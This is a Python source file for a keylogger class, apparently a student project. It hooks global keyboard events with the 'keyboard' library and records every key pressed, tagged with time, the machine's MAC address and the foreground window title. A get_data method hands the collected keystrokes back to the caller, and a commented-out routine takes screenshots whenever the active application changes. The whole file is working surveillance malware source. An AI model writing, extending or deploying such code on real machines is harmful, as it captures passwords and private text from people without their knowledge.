import keyboard
import os
import time
from PIL import ImageGrab
from getmac import get_mac_address
import win32gui

class KeyloggerService:
    def __init__(self):
        self.__action = False
        self.__data = {}
        self.prev_up = None
        self.current_app = None

    def __change_action(self):
        self.__action = not (self.__action)

    def return_action(self):
        return self.__action
    def __exit_point(self):
        if keyboard.is_pressed('shift+q'):
            # os._exit(0)
            self.__change_action()

    @staticmethod
    def __current_time() -> str:
        return time.strftime('%d/%m/%Y  %H:%M')


    def __on_press(self, pressed_key):
        key = pressed_key.name
        self.__add_to_data(self.__data, key)
        self.__exit_point()


    def __add_on_release(self, pressed_key):
        return pressed_key.name


    # def current_screenshot(self):
    #     if [self.prev_up] != [self.current_app]:
    #         screen_shot = ImageGrab.grab()
    #         path = rf"C:\Users\1\projet keylogger kodkode\picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
    #         screen_shot.save(path)
    #         self.prev_up = self.current_app

    def __add_to_data(self, dictionary: dict, data: str):
        current_time = self.__current_time()
        try:
            current_mac_address = get_mac_address()
        except:
            current_mac_address = "not was in enternet"
        current_app_1 = win32gui.GetForegroundWindow()
        current_app = win32gui.GetWindowText(current_app_1)
        self.current_app = rf"{current_app}"

        if not dictionary.get(current_mac_address):
            dictionary[current_mac_address] = {}
        if not dictionary[current_mac_address].get(current_time):
            dictionary[current_mac_address][current_time] = {}
        if not dictionary[current_mac_address][current_time].get(self.current_app):
            dictionary[current_mac_address][current_time][self.current_app] = []
        dictionary[current_mac_address][current_time][self.current_app].append(data)

    def start(self):
        self.__change_action()
        keyboard.on_press(self.__on_press)
        keyboard.on_release(self.__add_on_release)
        time.sleep(0.1)


    def get_data(self):
        data = self.__data
        self.__data = {}
        return data

    # def __enter__(self):
    #     self.start()

    # def __exit__(self, exc_type, exc_val, exc_tb):
    #     return 1
